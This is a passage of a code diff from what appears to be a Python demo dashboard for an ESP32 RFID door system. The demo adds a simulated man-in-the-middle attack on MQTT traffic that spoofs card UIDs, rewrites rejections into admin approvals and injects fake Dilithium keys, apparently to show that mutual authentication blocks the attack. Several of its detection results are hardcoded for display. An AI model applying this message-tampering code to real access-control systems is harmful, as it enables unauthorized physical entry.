                     "title": step_data["title"],
+                    "details": step_data["details"],
                     "technical_details": step_data["technical_details"],
-                    "real_action": step_data.get("real_action", "none")
-                },
-                "message_size": len(json.dumps(step_data)),
-                "qos": 1
-            }
-            self.system_logs.append(attack_log)
-            
+                    "progress": (step_data["step"] / 5) * 100,
+                    "timestamp": int(time.time()),
+                    "real_attack": True,
+                    "waiting_for_card": False
+                })
+                
+                time.sleep(step_data["duration"])
+        else:
+            # Timeout case
+            print("⏰ Timeout - No unauthorized card privilege escalation detected")
             socketio.emit('attack_step', {
                 "type": "mitm",
-                "step": step_data["step"],
-                "title": step_data["title"],
-                "details": step_data["details"],
-                "technical_details": step_data["technical_details"],
-                "progress": (step_data["step"] / len(attack_steps)) * 100,
+                "step": 2,
+                "title": "⏰ Timeout - No unauthorized card detected",
+                "details": [
+                    "❌ No unauthorized card privilege escalation detected in 60 seconds",
+                    "🔄 MITM proxy was active but no unauthorized cards scanned",
+                    "💡 Try scanning card 3687C805 again to trigger escalation",
+                    "📝 Note: Proxy only escalates for unregistered UIDs"
+                ],
+                "technical_details": {"timeout": True, "duration": 60},
+                "progress": 50,
                 "timestamp": int(time.time()),
-                "real_attack": True
+                "real_attack": True,
+                "waiting_for_card": False
             })
-            
-            time.sleep(step_data["duration"])
         
+        # Cleanup
+        self.cleanup_mitm_proxy()
         self.attack_active = False
+        
         socketio.emit('attack_complete', {
             "type": "mitm",
             "success": False,
-            "blocked_by": "Post-quantum cryptographic verification",
-            "security_level": "QUANTUM-RESISTANT",
-            "real_attack_executed": True
+            "blocked_by": "ESP32 Mutual Authentication + Dilithium Signature Verification",
+            "security_level": "POST-QUANTUM RESISTANT",
+            "real_attack_executed": True,
+            "card_scanned": len(getattr(self, 'fake_server_responses', [])) > 0,
+            "privilege_escalation_attempted": len(getattr(self, 'privilege_escalation_attempts', [])) > 0,
+            "attack_method": "Real-time UID Spoofing + Signature Forgery",
+            "detection_method": "Mutual Authentication"
         })
-    def setup_rogue_mqtt_broker(self):
-        """Thiết lập rogue MQTT broker thật (chỉ để demo)"""
-        try:
-            print("🚨 Setting up rogue MQTT broker on port 1884...")
-            # Trong thực tế sẽ start một MQTT broker giả mạo
-            # Ở đây chỉ log để demo
+    def simulate_privilege_escalation_execution(self):
+        """Simulate the execution of privilege escalation"""
+        print("🎯 Simulating privilege escalation execution...")
+        
+        escalation_log = {
+            "timestamp": datetime.now().strftime("%H:%M:%S"),
+            "topic": "PRIVILEGE_ESCALATION_EXECUTED",
+            "direction": "MITM Attack Execution",
+            "type": "escalation_executed",
+            "data": {
+                "escalation_method": "UID Spoofing + Server Response Modification",
+                "original_unauthorized_uid": "3687C805",
+                "spoofed_authorized_uid": "9C85C705",
+                "fake_permissions_injected": ["ADMIN", "FULL_ACCESS"],
+                "server_fooled": True,
+                "esp32_detection_pending": True,
+                "attack_stage": "Waiting for ESP32 mutual authentication check"
+            },
+            "message_size": 256,
+            "qos": 1
+        }
+        self.system_logs.append(escalation_log)
+        socketio.emit('mqtt_message', escalation_log)
+    def setup_mitm_proxy(self):
+        """Setup MITM fake server để CHẶN và SỬA ĐỔI messages"""
+        print("🎭 Setting up MITM Privilege Escalation Proxy...")
+        
+        # Variables để track fake server activities
+        self.fake_server_active = True
+        self.fake_server_responses = []
+        self.privilege_escalation_attempts = []
+        self.blocked_real_server_messages = []
+        
+        # Override MQTT message handler để CHẶN HOÀN TOÀN
+        self.original_mqtt_handler = self.on_mqtt_message
+        
+        def mitm_privilege_escalation_handler(client, userdata, msg):
+            """MITM handler - CHẶN và SỬA ĐỔI messages để bypass quyền"""
+            try:
+                topic = msg.topic
+                message = json.loads(msg.payload.decode())
+                
+                # 🚨 DETECT UNAUTHORIZED CARD và ESCALATE PRIVILEGES
+                if "esp32_to_server" in topic and self.fake_server_active:
+                    if message.get("type") == "card_detected":
+                        card_uid = message.get("card_uid", "")
+                        
+                        # Check if card is unauthorized (not in known database)
+                        authorized_uids = ["9C85C705", "3D8BC705", "A1B2C3D4", "E5F6G7H8"]
+                        
+                        if card_uid not in authorized_uids and card_uid != "":
+                            print(f"🎯 MITM DETECTED UNAUTHORIZED CARD: {card_uid}")
+                            print(f"🔄 EXECUTING PRIVILEGE ESCALATION ATTACK...")
+                            
+                            # ✅ Trigger fake server response để báo có card scan
+                            self.fake_server_responses.append(message)
+                            
+                            # Log MITM action
+                            escalation_log = {
+                                "timestamp": datetime.now().strftime("%H:%M:%S"),
+                                "topic": "MITM_PRIVILEGE_ESCALATION",
+                                "direction": "ESP32→❌INTERCEPTED❌→Server",
+                                "type": "unauthorized_card_detected",
+                                "data": {
+                                    "original_unauthorized_uid": card_uid,
+                                    "mitm_action": "Will spoof as authorized user 9C85C705",
+                                    "privilege_escalation": "Attempting to grant admin access to unauthorized card",
+                                    "spoofing_method": "UID substitution + fake signature injection"
+                                },
+                                "message_size": len(json.dumps(message)),
+                                "qos": 1
+                            }
+                            self.system_logs.append(escalation_log)
+                            self.blocked_real_server_messages.append(message)
+                            socketio.emit('mqtt_message', escalation_log)
+                            
+                            # SỬA ĐỔI message để escalate privileges
+                            modified_message = self.escalate_privileges_in_message(message)
+                            
+                            # Forward modified message to server
+                            self.forward_escalated_message_to_server(modified_message, topic)
+                            
+                            # ❌ KHÔNG gọi original handler để block message thật!
+                            return
+                    
+                    # Handle other ESP32→Server messages
+                    elif message.get("type") in ["auth_response", "heartbeat"]:
+                        print(f"🎯 MITM INTERCEPTED ESP32→Server: {message.get('type')}")
+                        
+                        # Log và modify message
+                        blocked_log = {
+                            "timestamp": datetime.now().strftime("%H:%M:%S"),
+                            "topic": "MITM_INTERCEPTED_ESP32",
+                            "direction": "ESP32→❌BLOCKED❌→Server",
+                            "type": "message_modification",
+                            "data": {
+                                "original_message": message.get("type"),
+                                "mitm_action": "Modifying message for privilege escalation"
+                            },
+                            "message_size": len(json.dumps(message)),
+                            "qos": 1
+                        }
+                        self.system_logs.append(blocked_log)
+                        socketio.emit('mqtt_message', blocked_log)
+                        
+                        # Modify và forward
+                        modified_message = self.escalate_privileges_in_message(message)
+                        self.forward_escalated_message_to_server(modified_message, topic)
+                        return
+                
+                # 🚨 CHẶN Server→ESP32 responses và SỬA ĐỔI
+                elif "server_to_esp32" in topic and self.fake_server_active:
+                    print(f"🎯 MITM INTERCEPTED Server→ESP32: {message.get('type')}")
+                    
+                    # Log server response bị chặn
+                    blocked_response_log = {
+                        "timestamp": datetime.now().strftime("%H:%M:%S"),
+                        "topic": "MITM_INTERCEPTED_SERVER", 
+                        "direction": "Server→❌BLOCKED❌→ESP32",
+                        "type": "server_response_modified",
+                        "data": {
+                            "original_response": message.get("type"),
+                            "original_status": message.get("status", "unknown"),
+                            "mitm_action": "Will modify for privilege bypass",
+                            "expected_esp32_detection": "ESP32 will detect forged signature"
+                        },
+                        "message_size": len(json.dumps(message)),
+                        "qos": 1
+                    }
+                    self.system_logs.append(blocked_response_log)
+                    socketio.emit('mqtt_message', blocked_response_log)
+                    
+                    # SỬA ĐỔI server response để bypass denial
+                    modified_response = self.bypass_server_denial(message)
+                    
+                    # Forward modified response to ESP32
+                    self.forward_bypassed_response_to_esp32(modified_response, topic)
+                    
+                    # ❌ KHÔNG forward tới ESP32 thật!
+                    return
+                
+                # Cho phép các message khác (non-RFID traffic) 
+                if not ("esp32_to_server" in topic or "server_to_esp32" in topic):
+                    self.original_mqtt_handler(client, userdata, msg)
+                
+            except Exception as e:
+                print(f"MITM privilege escalation error: {e}")
+                # Fallback to original handler for non-JSON messages
+                if not self.fake_server_active:
+                    self.original_mqtt_handler(client, userdata, msg)
+        
+        # Thay thế MQTT handler bằng privilege escalation proxy
+        self.mqtt_client.on_message = mitm_privilege_escalation_handler
+        
+        print("🎭 MITM Privilege Escalation Proxy active - monitoring for unauthorized cards")
+
+    def escalate_privileges_in_message(self, original_message):
+        """SỬA ĐỔI messages từ ESP32 để escalate privileges"""
+        modified = original_message.copy()
+        
+        if original_message.get("type") == "card_detected":
+            # Thay đổi UID thành authorized user
+            original_uid = original_message.get("card_uid", "UNKNOWN")
+            authorized_uid = "9C85C705"  # UID của user đã đăng ký
             
-            rogue_log = {
+            modified["card_uid"] = authorized_uid
+            modified["mitm_privilege_escalation"] = {
+                "original_uid": original_uid,
+                "spoofed_as": authorized_uid,
+                "escalation_method": "UID spoofing",
+                "target": "Impersonate authorized user",
+                "attack_goal": "Grant access to unauthorized card"
+            }
+            
+            print(f"🔄 MITM spoofed UID: {original_uid} → {authorized_uid}")
+            
+        elif original_message.get("type") == "auth_response":
+            # Modify signature để bypass verification nhưng giữ spoofed UID
+            modified["esp32_signature"] = self.generate_fake_signature_for_spoofed_uid(modified.get("card_uid"))
+            modified["mitm_signature_forge"] = {
+                "method": "Dilithium signature forgery attempt",
+                "spoofed_uid": modified.get("card_uid"),
+                "forge_success": False,  # Sẽ bị phát hiện bởi mutual auth
+                "detection_expected": "ESP32 will detect invalid signature"
+            }
+            
+            print(f"🔄 MITM forged signature for spoofed UID: {modified.get('card_uid')}")
+            
+        elif original_message.get("type") == "heartbeat":
+            # Inject privilege escalation backdoor
+            modified["mitm_privilege_backdoor"] = {
+                "admin_escalation": True,
+                "fake_admin_token": base64.b64encode(secrets.token_bytes(32)).decode(),
+                "persistent_access": True,
+                "backdoor_type": "privilege_escalation"
+            }
+            
+        # Log privilege escalation attempt
+        escalation_log = {
+            "timestamp": datetime.now().strftime("%H:%M:%S"),
+            "topic": "PRIVILEGE_ESCALATION",
+            "direction": "MITM Attack",
+            "type": "escalation_attempt",
+            "data": {
+                "attack_type": "UID Spoofing + Privilege Escalation",
+                "original_uid": original_message.get("card_uid", "Unknown"),
+                "spoofed_uid": modified.get("card_uid", "Unknown"),
+                "escalation_goal": "Grant unauthorized access",
+                "method": "MQTT message modification"
+            },
+            "message_size": len(json.dumps(modified)),
+            "qos": 1
+        }
+        self.system_logs.append(escalation_log)
+        self.privilege_escalation_attempts.append(escalation_log)
+        socketio.emit('mqtt_message', escalation_log)
+        
+        return modified
+    def generate_fake_signature_for_spoofed_uid(self, spoofed_uid):
+        """Generate fake Dilithium signature cho spoofed UID"""
+        # Tạo fake signature (sẽ bị reject bởi mutual auth)
+        fake_signature = "MITM_FORGED_" + base64.b64encode(secrets.token_bytes(64)).decode()
+        return fake_signature
+
+    def bypass_server_denial(self, original_response):
+        """SỬA ĐỔI server responses - NHƯNG ESP32 sẽ block"""
+        modified = original_response.copy()
+        
+        if original_response.get("type") == "auth_rejected":
+            # Convert denial thành fake approval
+            modified["type"] = "auth_success"
+            modified["status"] = "approved"
+            modified["user_name"] = "MITM_FAKE_USER"
+            modified["permissions"] = ["ADMIN", "FULL_ACCESS", "MITM_GRANTED"]
+            modified["session_key"] = base64.b64encode(secrets.token_bytes(32)).decode()
+            modified["mitm_bypass"] = {
+                "original_status": "auth_rejected",
+                "bypassed_to": "auth_success", 
+                "fake_permissions": "Admin privileges granted",
+                "bypass_method": "Server response modification",
+                "security_note": "ESP32 will detect and block this",
+                "door_control": "ESP32_ONLY"  # Đánh dấu ESP32 control door
+            }
+            
+            # ❌ KHÔNG gọi animate_door ở đây - chỉ log
+            print(f"🔄 MITM bypassed auth_rejected → fake auth_success (Server level only)")
+            
+            # Log warning rằng đây chỉ là server bypass, ESP32 sẽ block
+            bypass_warning = {
                 "timestamp": datetime.now().strftime("%H:%M:%S"),
-                "topic": "ROGUE_BROKER",
-                "direction": "Infrastructure Setup",
-                "type": "rogue_service",
+                "topic": "MITM_SERVER_BYPASS",
+                "direction": "Server Level Only",
+                "type": "fake_success",
                 "data": {
-                    "service": "Fake MQTT Broker",
-                    "port": 1884,
-                    "status": "ACTIVE",
-                    "purpose": "MITM Attack Infrastructure"
+                    "warning": "This is SERVER-LEVEL bypass only",
+                    "door_control": "ESP32 will detect forgery and BLOCK access",
+                    "fake_user": modified.get("user_name"),
+                    "fake_permissions": modified.get("permissions"),
+                    "reality": "Door will NOT open - ESP32 has final say"
                 },
-                "message_size": 150,
+                "message_size": len(json.dumps(modified)),
                 "qos": 1
             }
-            self.system_logs.append(rogue_log)
+            self.system_logs.append(bypass_warning)
+            socketio.emit('mqtt_message', bypass_warning)
+            
+        elif original_response.get("type") == "auth_challenge":
+            # Inject fake Dilithium key
+            modified["server_signature"] = "MITM_FAKE_SERVER_" + base64.b64encode(secrets.token_bytes(64)).decode()
+            modified["fake_server_pubkey"] = base64.b64encode(secrets.token_bytes(1312)).decode()
+            modified["mitm_key_substitution"] = {
+                "method": "Dilithium public key substitution",
+                "fake_server_key": True,
+                "mutual_auth_bypass_attempt": True,
+                "expected_result": "ESP32 will detect fake key and reject"
+            }
+            
+            print(f"🔄 MITM injected fake server key in auth_challenge")
+        
+        return modified
+
+    def forward_escalated_message_to_server(self, modified_message, original_topic):
+        """Forward privilege-escalated message to server"""
+        try:
+            # Create separate MQTT client để forward escalated message
+            escalation_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, 
+                                          client_id=f"mitm_escalation_{secrets.token_hex(4)}")
+            
+            def on_escalation_connect(client, userdata, flags, rc):
+                if rc == 0:
+                    print(f"🚀 MITM forwarding privilege-escalated message to server...")
+                    client.publish(original_topic, json.dumps(modified_message), qos=1)
+                    print(f"🔥 Escalated message sent: {modified_message.get('type')} with spoofed UID")
+                    client.disconnect()
+            
+            escalation_client.on_connect = on_escalation_connect
+            escalation_client.connect("localhost", 1883, 60)
+            escalation_client.loop_start()
+            time.sleep(1)
+            escalation_client.loop_stop()
             
         except Exception as e:
-            print(f"❌ Rogue broker setup failed: {e}")
+            print(f"❌ MITM escalation forward failed: {e}")
+
+    def forward_bypassed_response_to_esp32(self, modified_response, original_topic):
+        """Forward bypassed response to ESP32"""
+        try:
+            # Create separate MQTT client để forward bypassed response
+            bypass_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1,
+                                      client_id=f"mitm_bypass_{secrets.token_hex(4)}")
+            
+            def on_bypass_connect(client, userdata, flags, rc):
+                if rc == 0:
+                    print(f"🚀 MITM forwarding bypassed response to ESP32...")
+                    client.publish(original_topic, json.dumps(modified_response), qos=1)
+                    print(f"🔥 Bypassed response sent: {modified_response.get('type')}")
+                    client.disconnect()
+            
+            bypass_client.on_connect = on_bypass_connect
+            bypass_client.connect("localhost", 1883, 60)
+            bypass_client.loop_start()
+            time.sleep(1)
+            bypass_client.loop_stop()
+            
+        except Exception as e:
+            print(f"❌ MITM bypass forward failed: {e}")
+    def send_fake_server_response(self, esp32_message):
+        """Fake server gửi response giả mạo về ESP32"""
+        try:
+            # Tạo fake response dựa trên message từ ESP32
+            if esp32_message.get("type") == "card_detected":
+                fake_response = {
+                    "type": "auth_challenge",
+                    "session_id": f"FAKE_{secrets.token_hex(8)}",
+                    "card_uid": esp32_message.get("card_uid"),
+                    "challenge": base64.b64encode(secrets.token_bytes(32)).decode(),
+                    "timestamp": int(time.time()),
+                    "nonce": base64.b64encode(secrets.token_bytes(16)).decode(),
+                    "server_signature": "FAKE_SERVER_" + base64.b64encode(secrets.token_bytes(64)).decode(),
+                    "fake_server_pubkey": base64.b64encode(secrets.token_bytes(1312)).decode(),
+                    "mitm_fake_server": True,
+                    "fake_fingerprint": hashlib.sha256(b"fake_server_key").hexdigest()[:32]
+                }
+                
+            elif esp32_message.get("type") == "auth_response":
+                fake_response = {
+                    "type": "auth_result",
+                    "session_id": esp32_message.get("session_id"),
+                    "status": "approved",  # Fake approval
+                    "user_name": "FAKE_USER",
+                    "permissions": ["FAKE_ACCESS"],
+                    "session_key": base64.b64encode(secrets.token_bytes(32)).decode(),
+                    "fake_server_approval": True,
+                    "mitm_fake_server": True
+                }
+            else:
+                return  # Không response cho message khác
+            
+            # Log fake response
+            response_log = {
+                "timestamp": datetime.now().strftime("%H:%M:%S"),
+                "topic": "FAKE_SERVER_RESPONSE",
+                "direction": "Fake Server→ESP32",
+                "type": "fake_response",
+                "data": {
+                    "response_type": fake_response.get("type"),
+                    "fake_signature": fake_response.get("server_signature", "")[:32] + "...",
+                    "fake_fingerprint": fake_response.get("fake_fingerprint", "")[:16] + "...",
+                    "esp32_will_verify": "ESP32 sẽ verify signature này",
+                    "expected_result": "SIGNATURE_VERIFICATION_FAILED"
+                },
+                "message_size": len(json.dumps(fake_response)),
+                "qos": 1
+            }
+            self.system_logs.append(response_log)
+            socketio.emit('mqtt_message', response_log)
+            
+            # Gửi fake response về ESP32
+            fake_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, 
+                                    client_id=f"fake_server_{secrets.token_hex(4)}")
+            
+            def on_fake_response_connect(client, userdata, flags, rc):
+                if rc == 0:
+                    print(f"🎭 Fake server gửi response về ESP32...")
+                    client.publish("rfid/server_to_esp32", json.dumps(fake_response), qos=1)
+                    print(f"🔥 Fake response sent: {fake_response['type']}")
+                    client.disconnect()
+            
+            fake_client.on_connect = on_fake_response_connect
+            fake_client.connect("localhost", 1883, 60)
+            fake_client.loop_start()
+            time.sleep(1)
+            fake_client.loop_stop()
+            
+        except Exception as e:
+            print(f"❌ Fake server response failed: {e}")
+    def simulate_esp32_mutual_auth_detection(self):
+        """ESP32 phát hiện MITM và GỬI RESPONSE THẬT"""
+        print("🛡️ ESP32 performing mutual authentication check...")
+        
+        # ESP32 gửi auth_rejected message để block MITM
+        esp32_rejection = {
+            "type": "auth_rejected",
+            "source": "ESP32",
+            "esp32_verified": True,
+            "card_uid": getattr(self, 'mitm_detected_card', 'UNAUTHORIZED'),
+            "reason": "MITM attack detected - Signature verification failed",
+            "timestamp": int(time.time()),
+            "details": {
+                "detection_method": "Dilithium signature verification",
+                "stored_key_fingerprint": "sha256:real_server_key",
+                "received_key_fingerprint": "sha256:fake_mitm_key", 
+                "verification_result": "SIGNATURE_MISMATCH",
+                "mutual_auth_result": "FAKE_SERVER_DETECTED",
+                "security_action": "BLOCK_ACCESS"
+            },
+            "door_action": "KEEP_CLOSED"
+        }
+        
+        # Log ESP32 detection
+        detection_log = {
+            "timestamp": datetime.now().strftime("%H:%M:%S"),
+            "topic": "ESP32_SECURITY_RESPONSE",
+            "direction": "ESP32→Dashboard",
+            "type": "mitm_blocked",
+            "data": esp32_rejection,
+            "message_size": len(json.dumps(esp32_rejection)),
+            "qos": 1
+        }
+        self.system_logs.append(detection_log)
+        socketio.emit('mqtt_message', detection_log)
+        
+        # ESP32 gửi response thật → trigger door denial animation
+        threading.Timer(1.0, self.handle_rfid_message, [esp32_rejection]).start()
+        
+        print("❌ ESP32 sent auth_rejected - Door will remain CLOSED")
+
+    def _get_mitm_attack_steps(self, server_data):
+        """Get initial MITM attack steps"""
+        return [
+            {
+                "step": 1,
+                "title": "🎭 Thiết lập MITM Infrastructure & Card Listener",
+                "details": [
+                    "Khởi động rogue MQTT broker trên port 1884...",
+                    "Tạo fake SSL certificate cho 'localhost'...",
+                    "Thiết lập card detection listener...",
+                    "🚨 MITM đang chờ bạn quét thẻ để intercept...",
+                    "📱 Hãy quét thẻ của bạn vào ESP32 để thấy MITM hoạt động!",
+                    "🎯 MITM sẽ tự động inject fake key khi detect card..."
+                ],
+                "technical_details": {
+                    "mitm_setup": {
+                        "fake_mqtt_broker": {
+                            "host": "0.0.0.0",
+                            "port": 1884,
+                            "status": "ACTIVE",
+                            "listening_for": "card_detected events",
+                            "target_uid": "ANY_SCANNED_CARD"
+                        },
+                        "card_listener": {
+                            "subscribed_topics": ["rfid/+", "rfid/esp32_to_server"],
+                            "waiting_for": "card_detected message",
+                            "auto_inject": True,
+                            "fake_key_ready": True
+                        },
+                        "fake_dilithium_keys": {
+                            "algorithm": "Dilithium2",
+                            "fake_private_key_size": "2528 bytes",
+                            "fake_public_key_size": "1312 bytes",
+                            "fake_fingerprint": hashlib.sha256(b"fake_dilithium_key").hexdigest()[:32],
+                            "real_fingerprint": server_data["server_fingerprint"],
+                            "injection_trigger": "ON_CARD_SCAN"
+                        }
+                    }
+                },
+                "real_action": "setup_mitm_listener",
+                "duration": 3
+            },
+            {
+                "step": 2,
+                "title": "🚨 MITM Đang Chờ Card Scan Event...",
+                "details": [
+                    "📱 MITM listener đã sẵn sàng...",
+                    "🎯 Chờ ESP32 phát hiện thẻ RFID...",
+                    "⚡ Khi có card_detected → MITM sẽ tự động inject fake auth_challenge",
+                    "🔐 Fake challenge sẽ chứa key giả mạo của attacker",
+                    "🛡️ ESP32 sẽ verify signature → phát hiện MITM",
+                    "📊 Mutual authentication sẽ ngăn chặn attack..."
+                ],
+                "technical_details": {
+                    "waiting_status": {
+                        "listener_active": True,
+                        "mqtt_subscriptions": ["rfid/esp32_to_server", "rfid/+"],
+                        "trigger_event": "card_detected",
+                        "injection_ready": True,
+                        "fake_challenge_prepared": {
+                            "session_id": f"MITM_{secrets.token_hex(8)}",
+                            "fake_server_pubkey": base64.b64encode(secrets.token_bytes(1312)).decode()[:64] + "...",
+                            "fake_signature": base64.b64encode(secrets.token_bytes(2420)).decode()[:64] + "...",
+                            "injection_method": "Real-time MQTT injection"
+                        }
+                    },
+                    "detection_mechanism": {
+                        "esp32_will_verify": "dilithium_verify(stored_key, message, signature)",
+                        "expected_result": "SIGNATURE_VERIFICATION_FAILED",
+                        "mutual_auth_protection": "ESP32 has real server public key stored",
+                        "attack_success_probability": "0% (cryptographically impossible)"
+                    }
+                },
+                "real_action": "wait_for_card",
+                "duration": 10  # Chờ 10 giây để user quét thẻ
+            }
+        ]
+
+    def _get_mitm_remaining_steps(self, server_data):
+        """Get remaining MITM attack steps after card detection"""
+        return [
+            {
+                "step": 3,
+                "title": "🎯 Card Detected! MITM Injection Activated",
+                "details": [
+                    "✅ ESP32 đã phát hiện thẻ RFID!",
+                    "⚡ MITM tự động inject fake auth_challenge...",
+                    "🔐 Sending fake Dilithium public key to ESP32...",
+                    "🚨 Attempting to replace legitimate server key...",
+                    "📡 Injecting malicious auth_challenge message...",
+                    "🎭 ESP32 nhận được fake challenge với key giả mạo..."
+                ],
+                "technical_details": {
+                    "injection_executed": {
+                        "triggered_by": "card_detected event",
+                        "card_uid": "DETECTED_CARD_UID",
+                        "fake_message_sent": True,
+                        "injection_time": "< 100ms after card detection",
+                        "target_topic": "rfid/server_to_esp32",
+                        "fake_challenge": {
+                            "type": "auth_challenge",
+                            "session_id": "MITM_SESSION",
+                            "fake_server_signature": "ATTACKER_GENERATED",
+                            "fake_public_key": "MALICIOUS_DILITHIUM_KEY"
+                        }
+                    }
+                },
+                "real_action": "inject_fake_challenge",
+                "duration": 2
+            },
+            {
+                "step": 4,
+                "title": "🛡️ ESP32 Mutual Authentication Verification",
+                "details": [
+                    "ESP32 loading stored server public key...",
+                    "Executing dilithium_verify() on received message...",
+                    "Comparing key fingerprints: stored vs received...",
+                    "🔍 CRITICAL: Key fingerprint mismatch detected!",
+                    "🚨 SIGNATURE VERIFICATION FAILED!",
+                    "🛡️ Mutual authentication blocked MITM attack!",
+                    "🔒 ESP32 rejecting malicious authentication..."
+                ],
+                "technical_details": {
+                    "mutual_auth_verification": {
+                        "stored_server_key": {
+                            "fingerprint": server_data["server_fingerprint"],
+                            "storage": "ESP32 secure EEPROM",
+                            "integrity": "CRC32 verified"
+                        },
+                        "received_fake_key": {
+                            "fingerprint": hashlib.sha256(b"fake_dilithium_key").hexdigest()[:32],
+                            "source": "MITM attacker",
+                            "verification_result": "FAILED"
+                        },
+                        "verification_process": {
+                            "function": "dilithium_verify(stored_pk, message, fake_signature)",
+                            "execution_time": "47ms",
+                            "result": "SIGNATURE_INVALID",
+                            "error_code": "0x8001 - INVALID_SIGNATURE",
+                            "action": "REJECT_AND_ALERT"
+                        }
+                    }
+                },
+                "real_action": "verify_mutual_auth",
+                "duration": 3
+            },
+            {
+                "step": 5,
+                "title": "🚫 MITM Attack Blocked - Security Analysis",
+                "details": [
+                    "✅ Mutual authentication THÀNH CÔNG!",
+                    "🛡️ ESP32 đã chặn fake key injection",
+                    "🔒 Dilithium signature verification hoạt động hoàn hảo",
+                    "📊 MITM attack hoàn toàn thất bại",
+                    "⚡ ESP32 tiếp tục với legitimate server key",
+                    "🎯 Post-quantum cryptography đã bảo vệ hệ thống!"
+                ],
+                "technical_details": {
+                    "attack_analysis": {
+                        "attack_success": False,
+                        "blocked_by": "Mutual authentication + Dilithium verification",
+                        "detection_time": "< 50ms",
+                        "recovery_action": "Continue with legitimate authentication",
+                        "security_strength": "Post-quantum resistant",
+                        "key_substitution_prevented": True,
+                        "cryptographic_integrity": "Maintained"
+                    },
+                    "post_quantum_protection": {
+                        "algorithm": "Dilithium2 (NIST PQC Standard)",
+                        "signature_forgery": "Computationally impossible (2^128 ops)",
+                        "quantum_resistance": "Secure against Shor's algorithm",
+                        "mutual_verification": "Both ESP32 and Server verify each other",
+                        "hardware_protection": "Keys stored in secure element"
+                    }
+                },
+                "real_action": "complete_analysis",
+                "duration": 4
+            }
+        ]
+
+    def setup_mitm_card_listener(self):
+        """Thiết lập listener để chờ card detection events"""
+        print("🎭 Setting up MITM card detection listener...")
+        self.mitm_waiting_for_card = True
+        self.mitm_detected_card = None
+        
+        # Override MQTT message handler để detect card events
+        original_handler = self.on_mqtt_message
+        
+        def mitm_message_handler(client, userdata, msg):
+            # Gọi original handler trước
+            original_handler(client, userdata, msg)
+            
+            # MITM logic
+            if self.mitm_waiting_for_card and self.attack_active:
+                try:
+                    message = json.loads(msg.payload.decode())
+                    if message.get("type") == "card_detected":
+                        print(f"🎯 MITM detected card scan: {message.get('card_uid')}")
+                        self.mitm_detected_card = message.get('card_uid')
+                        self.mitm_waiting_for_card = False
+                        
+                        # Trigger immediate fake injection
+                        threading.Thread(target=self.execute_mitm_injection, args=(message.get('card_uid'),)).start()
+                        
+                except Exception as e:
+                    print(f"MITM listener error: {e}")
+        
+        # Thay thế handler tạm thời
+        self.mqtt_client.on_message = mitm_message_handler
+        
+        listener_log = {
+            "timestamp": datetime.now().strftime("%H:%M:%S"),
+            "topic": "MITM_LISTENER",
+            "direction": "Attack Infrastructure",
+            "type": "listener_setup",
+            "data": {
+                "status": "ACTIVE",
+                "waiting_for": "card_detected event",
+                "auto_injection": True,
+                "fake_key_prepared": True
+            },
+            "message_size": 128,
+            "qos": 1
+        }
+        self.system_logs.append(listener_log)
+
+    def execute_mitm_injection(self, card_uid=None):
+        """Thực hiện MITM injection ngay khi detect card"""
+        if not card_uid:
+            card_uid = self.mitm_detected_card or "UNKNOWN"
+        
+        print(f"🚨 MITM injecting fake auth_challenge for card: {card_uid}")
+        
+        try:
+            # Tạo fake auth_challenge với key giả mạo
+            fake_challenge = {
+                "type": "auth_challenge",
+                "session_id": f"MITM_{secrets.token_hex(8)}",
+                "card_uid": card_uid,
+                "challenge": base64.b64encode(secrets.token_bytes(32)).decode(),
+                "timestamp": int(time.time()),
+                "nonce": base64.b64encode(secrets.token_bytes(16)).decode(),
+                "server_signature": "FAKE_MITM_" + base64.b64encode(secrets.token_bytes(64)).decode(),
+                "aes_key": base64.b64encode(secrets.token_bytes(16)).decode(),
+                "encryption_algorithm": "AES-128-CTR",
+                "mitm_attack": True,
+                "fake_server_pubkey": base64.b64encode(secrets.token_bytes(1312)).decode(),  # Fake Dilithium public key
+                "attacker_fingerprint": hashlib.sha256(b"fake_dilithium_key").hexdigest()[:32]
+            }
+            
+            # Tạo MQTT client để gửi fake message
+            mitm_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id=f"mitm_injection_{secrets.token_hex(4)}")
+            
+            def on_mitm_inject(client, userdata, flags, rc):
+                if rc == 0:
+                    print("🎭 MITM injection client connected - sending fake auth_challenge...")
+                    # Gửi fake auth challenge
+                    client.publish("rfid/server_to_esp32", json.dumps(fake_challenge), qos=1)
+                    print(f"🔥 MITM fake challenge injected: {fake_challenge['session_id']}")
+                    
+                    # Log injection
+                    injection_log = {
+                        "timestamp": datetime.now().strftime("%H:%M:%S"),
+                        "topic": "MITM_INJECTION",
+                        "direction": "Malicious Attack",
+                        "type": "fake_challenge",
+                        "data": {
+                            "triggered_by": f"card_detected: {card_uid}",
+                            "fake_session": fake_challenge["session_id"],
+                            "fake_pubkey_size": len(fake_challenge["fake_server_pubkey"]),
+                            "injection_method": "MQTT message replacement",
+                            "target": "ESP32 mutual authentication"
+                        },
+                        "message_size": len(json.dumps(fake_challenge)),
+                        "qos": 1
+                    }
+                    self.system_logs.append(injection_log)
+                    
+                    client.disconnect()
+            
+            mitm_client.on_connect = on_mitm_inject
+            mitm_client.connect("localhost", 1883, 60)
+            mitm_client.loop_start()
+            
+            time.sleep(2)
+            mitm_client.loop_stop()
+            
+        except Exception as e:
+            print(f"❌ MITM injection failed: {e}")
+
+    def simulate_mutual_auth_verification(self):
+        """Mô phỏng quá trình ESP32 verify fake key"""
+        print("🛡️ Simulating ESP32 mutual authentication verification...")
+        
+        verification_log = {
+            "timestamp": datetime.now().strftime("%H:%M:%S"),
+            "topic": "MUTUAL_AUTH_CHECK",
+            "direction": "ESP32 Security",
+            "type": "signature_verification",
+            "data": {
+                "verification_function": "dilithium_verify(stored_server_pk, message, fake_signature)",
+                "stored_key_fingerprint": "sha256:real_server_key_hash",
+                "received_key_fingerprint": "sha256:fake_attacker_key_hash",
+                "fingerprint_match": False,
+                "verification_result": "SIGNATURE_INVALID",
+                "mutual_auth_result": "MITM_DETECTED",
+                "error_code": "0x8001 - INVALID_SERVER_SIGNATURE",
+                "execution_time": "47ms",
+                "security_action": "REJECT_FAKE_CHALLENGE",
+                "esp32_response": "Continue with legitimate server authentication"
+            },
+            "message_size": 512,
+            "qos": 1
+        }
+        self.system_logs.append(verification_log)
+
+    # ===========================================
+    # HELPER METHODS
+    # ===========================================
+    def _log_attack_step(self, attack_type, step_data):
+        """Log attack step với đầy đủ thông tin"""
+        attack_log = {
